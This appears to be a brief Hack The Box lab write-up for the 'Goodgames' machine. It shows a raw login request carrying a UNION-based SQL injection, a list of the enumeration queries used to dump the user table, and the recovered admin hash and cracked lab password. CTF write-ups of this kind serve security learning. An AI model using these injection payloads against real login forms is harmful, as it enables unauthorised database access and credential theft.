# Goodgames HTB
## SQLI Vulnerable in the Login page


```bash
POST /login HTTP/1.1
Host: 10.129.77.110
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Origin: http://10.129.77.110
Connection: keep-alive
Referer: http://10.129.77.110/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email='%20union%20select%201%2c%202%2c%203%2c%20group_concat(id%2c%200x3a%2c%20email%2c%200x3a%2c%20password)%20from%20user--%20-&password=admin%27+or+1%3D1--+-
```
### Techniques used:

- **ORDER BY 4-- -**
- **UNION SELECT 1, 2, 3, 4-- -**
- **UNION SELECT 1, 2, 3, schema_name from information_schema.schemata-- -** (found Database name `main`)
- **UNION SELECT 1, 2, 3, table_name from information_schema.tables where table_schema='main'-- -** (found table name `user`)
- **UNION SELECT 1, 2, 3, column_name from information_schema.columns where table_schema='main' and table_name='user'** (found columns `id` `email` `password`)
- **UNION SELECT 1, 2, 3, group_concat(id, 0x3a, email, 0x3a, password)** (here enumrate those fields to get the credentials)

Found credentials in the database

- **1:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec**
- **admin@googdgames.htb:superadministrator** (Decreypted for Crackstation.net)


